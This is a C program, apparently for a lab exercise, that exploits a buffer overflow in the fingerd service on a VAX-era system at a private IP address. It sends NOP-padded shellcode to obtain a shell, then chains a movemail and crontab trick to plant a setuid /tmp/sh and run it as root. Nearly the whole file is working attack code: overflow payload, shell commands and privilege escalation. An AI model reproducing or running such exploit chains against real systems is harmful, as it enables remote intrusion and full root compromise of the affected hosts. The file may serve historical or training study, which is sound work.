#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#define TARGET_IP "172.20.0.12"
#define FINGERD_PORT 79

#define BUF_SIZE 512 + 16 + 4 // finger buffer size + four 4 byte words + 4byte address
#define PAYLOAD "\335\217/sh\0\335\217/bin\320^Z\335\0\335\0\335Z\335\003\320^\\\274;\344\371\344\342\241\256\343\350\357\256\362\351"
#define PAYLOAD_LEN 28
#define NOP 0x01	// VAX nop instruction
					
#define PATIENCE 3					
#define IO_BUF_SIZE 2048


void create_exploit(char *buf, char *shellcode, ssize_t buf_size, ssize_t shellcode_len) {
	int i, j;
	int extra_words = 4 * 4;
	int address_size = 4;
    for (i = 0; i < buf_size; i++) buf[i] = NOP;  
    for (j = 0; j < shellcode_len; j++) buf[300+j] = shellcode[j]; 

	// from rapid7 article
	for (i = buf_size - extra_words - address_size; i < buf_size - address_size; i ++) { 
		buf[i] = 0x00; 
	}
	// some place within the buffer
    for (i = buf_size - address_size; i < buf_size; i += 4) {
        buf[i]   = 0x38; 
        buf[i+1] = 0xea;
        buf[i+2] = 0xff;
        buf[i+3] = 0x7f;
    }
}	

void read_from_sock(int sock, fd_set *read_fds, char *io_buf, size_t buf_size) {
	// read until there are no more bytes to read 
	// try PATIENCE times until quitting
	int num_tries = 0;
	while (num_tries < PATIENCE) {
		FD_ZERO(read_fds);
		FD_SET(sock, read_fds);

		struct timeval tv;
		tv.tv_sec = 1;  
		tv.tv_usec = 0;

		int ready_fds = select(sock + 1, read_fds, NULL, NULL, &tv);
		if (ready_fds > 0 && FD_ISSET(sock, read_fds)) {
			int n = read(sock, io_buf, buf_size - 1);
			if (n > 0) {
				io_buf[n] = '\0'; 
				printf("%s", io_buf); // Print results to your screen
				fflush(stdout);
				num_tries = 0; 
			} else {	
				break;
			}
		} else {
			num_tries++;
		}	
	}	
}	

void write_to_sock(int sock, fd_set *write_fds, char *text) {
	int num_tries = 0;
	size_t total_sent = 0;
	size_t len = strlen(text);

	while (num_tries < PATIENCE) {
		FD_ZERO(write_fds);
		FD_SET(sock, write_fds);

		struct timeval tv;
		tv.tv_sec = 1;  
		tv.tv_usec = 0;

		int ready_fds = select(sock + 1, NULL, write_fds, NULL, &tv);
		if (ready_fds > 0 && FD_ISSET(sock, write_fds)) {
			int n = write(sock, text + total_sent, len - total_sent);
			if (n > 0) { 
				total_sent += n;
				num_tries = 0;
			} else {	
				break;
			}	
		} else {
			num_tries++;
		}	
	}	
}	

void read_write_sock(
		int sock, 
		fd_set *read_fds, 
		fd_set *write_fds, 
		char *text, 
		char *io_buf, 
		size_t buf_size) {
	write_to_sock(sock, write_fds, text);
	read_from_sock(sock, read_fds, io_buf, buf_size);
}	

int main() {
    int sock = 0;
    struct sockaddr_in serv_addr;
	char io_buf[IO_BUF_SIZE];

    char buf[532] = {0};
	create_exploit(buf, PAYLOAD, (ssize_t)BUF_SIZE, (ssize_t)PAYLOAD_LEN);

	//create socket
	sock = socket(AF_INET, SOCK_STREAM, 0);

	// target network address info
	serv_addr.sin_family = AF_INET; 		
	serv_addr.sin_port = htons(FINGERD_PORT);
	inet_pton(AF_INET, TARGET_IP, &serv_addr.sin_addr);

	// connect to fingerd
	connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

	// deliever payload; fingerd should now be a shell
	write(sock, buf, sizeof(buf));
    printf("Payload delivered!\n");

	char *echo_command = "echo connected123\n";
	char *export_path = "PATH=/bin:/usr/bin:/usr/ucb:/etc; export PATH\n";
	char *whoami = "whoami\n";
	char *ls = "ls -al\n";

	// from rapid7's article, assuming that movemail is on the local system with setuid bit set
	char *movemail_exploit = "(umask 0 && /etc/movemail /dev/null /usr/lib/crontab.local)\n";
	char *crontab_exploit = "(echo \"* * * * * root cp /bin/sh /tmp && chmod u+s /tmp/sh\"; echo  \"* * * * * root rm -f /usr/lib/crontab.local\") > /usr/lib/crontab.local\n";
	char *check_crontab = "cat /usr/lib/crontab.local\n";
	char *check_for_shell = "ls /tmp/sh\n"; // this needs to be ran multiple times until cronjob does its thing
	char *run_shell = "/tmp/sh\n"; 
	char *touch_file = "cd /; echo Hello from ubuntu! > hello_from_ubuntu; cat hello_from_ubuntu\n";

	fd_set read_fds;
	fd_set write_fds;

	// the first command probably gets ignored
	read_write_sock(sock, &read_fds, &write_fds, echo_command, io_buf, (size_t)IO_BUF_SIZE);
	read_write_sock(sock, &read_fds, &write_fds, export_path, io_buf, (size_t)IO_BUF_SIZE);
	read_write_sock(sock, &read_fds, &write_fds, whoami, io_buf, (size_t)IO_BUF_SIZE);
	read_write_sock(sock, &read_fds, &write_fds, movemail_exploit, io_buf, (size_t)IO_BUF_SIZE);
	read_write_sock(sock, &read_fds, &write_fds, crontab_exploit, io_buf, (size_t)IO_BUF_SIZE);

	// because cronjob has to run, block here until /tmp/sh is found
	char *not_found = "/tmp/sh not found";
	do {
		read_write_sock(sock, &read_fds, &write_fds, check_for_shell, io_buf, (size_t)IO_BUF_SIZE);
		sleep(10);
	} while (!strncmp(not_found, io_buf, strlen(not_found)));

	// running the shell with setuid bit set
	read_write_sock(sock, &read_fds, &write_fds, run_shell, io_buf, (size_t)IO_BUF_SIZE);

	// now you should have root shell!
	read_write_sock(sock, &read_fds, &write_fds, whoami, io_buf, (size_t)IO_BUF_SIZE);
	read_write_sock(sock, &read_fds, &write_fds, touch_file, io_buf, (size_t)IO_BUF_SIZE);

	close(sock);

    return 0;
}
